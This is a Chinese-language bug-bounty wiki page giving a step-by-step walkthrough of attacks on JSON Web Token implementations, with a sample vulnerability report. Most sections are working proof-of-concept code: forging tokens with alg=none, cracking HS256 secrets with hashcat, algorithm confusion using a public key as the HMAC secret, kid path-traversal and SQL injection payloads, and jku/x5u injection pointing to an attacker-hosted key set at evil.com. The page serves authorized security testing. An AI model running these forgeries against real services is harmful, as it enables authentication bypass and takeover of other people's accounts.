---
type: wiki
category: attack
tool: jwt
status: active
last-updated: 2026-04-21
---

# JWT 攻擊 Walkthrough

> **用途：** JWT 是現代 SPA 的主要 session token，常見實作錯誤可達 P1 ATO。
> 這篇從 anatomy → 所有實作缺陷 → 現實 PoC 一條龍。

## 0. Anatomy

```
header.payload.signature

# header 範例
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
→ {"alg":"HS256","typ":"JWT"}

# payload 範例
eyJzdWIiOiIxMjM0IiwibmFtZSI6IkpvaG4iLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTczNjAwMDAwMH0
→ {"sub":"1234","name":"John","admin":false,"exp":1736000000}

# signature = HMAC_SHA256(base64(header) + "." + base64(payload), secret)
```

### 解碼快速工具

```bash
# CLI
echo "eyJhbGciOi..." | cut -d. -f1 | base64 -d 2>/dev/null | jq
echo "eyJhbGciOi..." | cut -d. -f2 | base64 -d 2>/dev/null | jq

# 裝 jwt-cli（更方便）
brew install mike-engel/jwt-cli/jwt-cli
jwt decode "eyJhbGciOi..."

# 或用 jq + base64url 處理 padding
decode() { echo "$1" | sed 's/-/+/g;s/_/\//g' | base64 -d 2>/dev/null | jq; }
decode $(echo $TOKEN | cut -d. -f2)
```

### 裝必要工具

```bash
# jwt_tool — 最強 Swiss army knife
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt
alias jwt_tool='python3 ~/Tools/jwt_tool/jwt_tool.py'

# hashcat — brute HS256 secret
brew install hashcat

# jwtxpl（另一個選擇）
git clone https://github.com/DontPanicO/jwtXploiter
pip3 install -e ./jwtXploiter
```

## 1. `alg: none`（P1 if vuln）

### 原理
有些 lib 接受 `"alg":"none"`，signature 留空就過。

### PoC

```bash
TOKEN="eyJhbGciOi..."

# 手動
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"1","admin":true}' | base64 | tr -d '=' | tr '+/' '-_')
FORGED="${HEADER}.${PAYLOAD}."   # 注意結尾的 .

# jwt_tool 自動
jwt_tool $TOKEN -X a
```

### 驗證

```bash
curl -sk https://target.com/api/me -H "Authorization: Bearer $FORGED"
# 若回 200 + admin:true → P1 auth bypass
```

### 常見變體（大小寫繞過）

```
"alg":"None"
"alg":"NONE"
"alg":"nOnE"
"alg":""
```

## 2. 弱 HS256 secret brute

### 原理
HS256 是對稱加密，secret 弱就可離線 brute。

### PoC（hashcat）

```bash
# 把整個 token 寫進檔
echo "eyJhbGciOiJI...fullToken" > jwt.txt

# mode 16500 = JWT HS256
hashcat -m 16500 jwt.txt rockyou.txt

# 常見 secret 字典（先試）
hashcat -m 16500 jwt.txt /opt/wordlists/jwt.secrets.list

# 自訂 rules
hashcat -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 常見超爛 secret 清單

```
secret
your-256-bit-secret
jwt_secret
supersecret
password
admin
changeme
default
test
my-secret-key
```

或用 **jwt-wordlist**（專門收集的）：https://github.com/wallarm/jwt-secrets

### Brute 成功後偽造

```bash
jwt_tool $TOKEN -S hs256 -p "secret123"
# 或
jwt_tool $TOKEN -X k -pk "secret123"
```

## 3. Algorithm confusion（RS256 → HS256）

### 原理
Server 用 `verify(token, publicKey)`，沒檢查 alg。
攻擊者把 header 改成 HS256，signature 用 **public key 當 secret** 簽。

### 取得 public key

```bash
# 方法 A: JWK endpoint
curl -s https://target.com/.well-known/jwks.json | jq

# 方法 B: OpenID config
curl -s https://target.com/.well-known/openid-configuration | jq .jwks_uri

# 方法 C: TLS cert（少數情況 key 同）
openssl s_client -connect target.com:443 -showcerts < /dev/null | \
  openssl x509 -pubkey -noout
```

### PoC

```bash
# jwt_tool 自動
jwt_tool $TOKEN -X k -pk public.pem

# 或手動 (python)
python3 << 'EOF'
import jwt
with open('public.pem') as f:
    public_key = f.read()
# 關鍵：傳 public key 當 HS256 secret
forged = jwt.encode(
    {"sub":"1","admin":True},
    public_key,
    algorithm="HS256"
)
print(forged)
EOF
```

### 驗證

```bash
curl -sk https://target.com/api/me -H "Authorization: Bearer $FORGED"
```

## 4. `kid` header injection

### 原理
`kid`（key ID）是 key lookup 用的，若實作未消毒可能：
- Path traversal: `kid: "../../../../dev/null"` → server 讀空檔案當 key → 可用空 string 簽
- SQL injection: `kid: "' UNION SELECT 'x"` → 回傳 `x` 當 key

### PoC（kid LFI → null key）

```bash
# jwt_tool 自動
jwt_tool $TOKEN -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""

# 或手動
HEADER='{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}'
# 之後用空 secret 簽
```

### PoC（kid SQL injection）

```
"kid":"a' UNION SELECT 'AAAAA"
```
→ server 查 DB `SELECT key FROM keys WHERE id='a' UNION SELECT 'AAAAA'`
→ 回 `AAAAA` 當 HMAC key
→ 攻擊者用 `AAAAA` 簽

```bash
jwt_tool $TOKEN -I -hc kid -hv "x' UNION SELECT 'ExpectedKey" -S hs256 -p "ExpectedKey"
```

## 5. `jku` / `x5u` injection

### 原理
`jku` = JSON Web Key Set URL（告訴 server 去哪抓 public key）。
若 server 不驗 jku domain → 攻擊者丟自己的 JWK set → 用自己的 private key 簽。

### PoC

```bash
# 步驟 1: 生 keypair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 步驟 2: public key → JWK 格式
python3 << 'EOF'
from jwcrypto import jwk
with open('public.pem','rb') as f:
    key = jwk.JWK.from_pem(f.read())
    key_data = key.export_public(as_dict=True)
    key_data['kid'] = 'attacker-key'
print({"keys":[key_data]})
EOF
# 把 JWKS 放自己的 server: https://evil.com/jwks.json

# 步驟 3: forge token
python3 << 'EOF'
import jwt
with open('private.pem') as f:
    priv = f.read()
token = jwt.encode(
    {"sub":"1","admin":True},
    priv,
    algorithm="RS256",
    headers={"jku":"https://evil.com/jwks.json","kid":"attacker-key"}
)
print(token)
EOF
```

### jku bypass 變體

```
"jku":"https://target.com@evil.com/jwks.json"
"jku":"https://target.com.evil.com/jwks.json"
"jku":"https://evil.com/jwks.json#target.com"
"jku":"https://target.com/../../../evil.com/jwks.json"
```

## 6. `x5c` / `x5u` embedded cert

類似 jku，但 cert 直接嵌在 header（x5c）或 URL 取（x5u）。若 server 信任 header 中的 cert，攻擊者自簽 cert 就能 forge。

```bash
jwt_tool $TOKEN -X s -I -hc x5c -hv "<base64 cert>"
```

## 7. Token 未過期 / 未撤銷

### 測試

```bash
# 登出後原 token 還能用？
curl -X POST https://target.com/logout -H "Authorization: Bearer $TOKEN"
curl https://target.com/api/me -H "Authorization: Bearer $TOKEN"
# 若仍回 200 → logout 無效（session 未 blacklist）→ P3

# 改密碼後舊 token 還能用？
# 改密碼 → 用舊 token
curl https://target.com/api/me -H "Authorization: Bearer $OLD_TOKEN"
# 若回 200 → 密碼變更未撤銷 token → P2
```

### 長效 token

```
# 看 exp 多久
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .exp
# 若 exp 大於 1 年 → 風險
# 若 無 exp → P3 (規格要求有)
```

## 8. Information disclosure in payload

```bash
# 解碼 payload，看有沒有：
# - password / password_hash
# - internal user ID
# - API key
# - email
# - role / permission map

echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq
```

常見洩漏：

```json
{
  "sub":"u_123",
  "email":"admin@target.com",
  "role":"admin",
  "permissions":["*"],
  "db_user":"root",      // ❌ 洩漏
  "internal_id":"42",    // ❌ 洩漏
  "avatar":"s3://private-bucket/..." // ❌ 洩漏
}
```

## 9. Signature 驗證被繞過（常見 lib bug）

### PyJWT <1.5.0：alg 未強制

```python
# vulnerable
jwt.decode(token, public_key)   # 未傳 algorithms=

# 攻擊者送 HS256 + public_key 當 secret → pass
```

### jsonwebtoken (Node) <4.0：同上

### golang-jwt：alg confusion 需明確拒絕

### 測試技巧
若應用 lib 版本舊（package.json / go.sum 洩漏），必試 alg confusion + none。

## 10. 現實完整攻擊鏈（範例）

假設目標：
- JWT HS256
- header 有 `kid`
- 登入可取 low-priv token

### Step 1: 判斷 alg

```bash
jwt decode $TOKEN
# "alg":"HS256"
```

### Step 2: 嘗試 alg=none

```bash
jwt_tool $TOKEN -X a
# 失敗 → lib 有防禦
```

### Step 3: Brute HS256 secret

```bash
echo $TOKEN > jwt.txt
hashcat -m 16500 jwt.txt rockyou.txt
# 若 crack → 用 cracked secret forge admin token
```

### Step 4: kid injection

```bash
# 若 kid 是檔名型
jwt_tool $TOKEN -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

# 若 kid 是 DB 查詢
jwt_tool $TOKEN -I -hc kid -hv "x'||CHR(65)||CHR(65)||CHR(65)||CHR(65)||'" -S hs256 -p "AAAA"
```

### Step 5: Payload 竄改

```bash
# 改 user_id / role
jwt_tool $TOKEN -T
# 互動式改，之後重新簽
```

## 11. bbflow 整合

```bash
# hunt-jwt hunter 自動檢測：
# - alg none
# - weak HS256（內建小字典）
# - long expiry
# - 敏感資料洩漏
bbflow hunt target.com --only jwt

# 更深：jwt_tool 全掃
jwt_tool $TOKEN -M at
# -M at = all tests
```

## 12. 常用 jwt_tool 指令速查

```bash
# 解碼
jwt_tool $TOKEN

# 所有自動測試
jwt_tool $TOKEN -M at

# 測 alg confusion
jwt_tool $TOKEN -X k -pk public.pem

# 竄改 payload
jwt_tool $TOKEN -T

# Brute HS256
jwt_tool $TOKEN -C -d secrets.txt

# 改 alg=none
jwt_tool $TOKEN -X a

# kid injection
jwt_tool $TOKEN -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

# jku injection
jwt_tool $TOKEN -X s -I -hc jku -hv "https://evil.com/jwks.json"
```

## 13. 報告 template

```markdown
## 漏洞概述
https://api.target.com 使用 JWT HS256 做 session auth，secret 為 `changeme`（字典可 brute），
攻擊者可 crack secret 後偽造任意使用者 token，完成 account takeover。

## 重現步驟

### Step 1: 登入取得合法 token
curl -X POST https://api.target.com/login \
  -d '{"email":"attacker@x.com","password":"xxx"}'
# → token: eyJhbGciOiJIUzI1NiIs...

### Step 2: 分析 token
jwt decode $TOKEN
# alg: HS256
# payload: {"sub":"u_attacker","role":"user","exp":..}

### Step 3: Brute secret
echo $TOKEN > jwt.txt
hashcat -m 16500 jwt.txt rockyou.txt
# → 15 秒後 crack: "changeme"

### Step 4: 偽造 admin token
jwt_tool $TOKEN -S hs256 -p "changeme" -T
# 改 sub:"u_admin", role:"admin"

### Step 5: 驗證
curl https://api.target.com/admin/users \
  -H "Authorization: Bearer $FORGED"
# → 200，回傳全站使用者列表

## Impact
- 任意 user ATO
- 未驗證使用者升權為 admin
- 全站使用者資料可讀（PII）

## Severity
P1 / Critical
```

## 關聯文件

- [../hunters/hunt-jwt.sh](../hunters/hunt-jwt.sh)
- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) § 10-11 JWT 章節
- PortSwigger JWT Labs: https://portswigger.net/web-security/jwt
- jwt_tool Wiki: https://github.com/ticarpi/jwt_tool/wiki
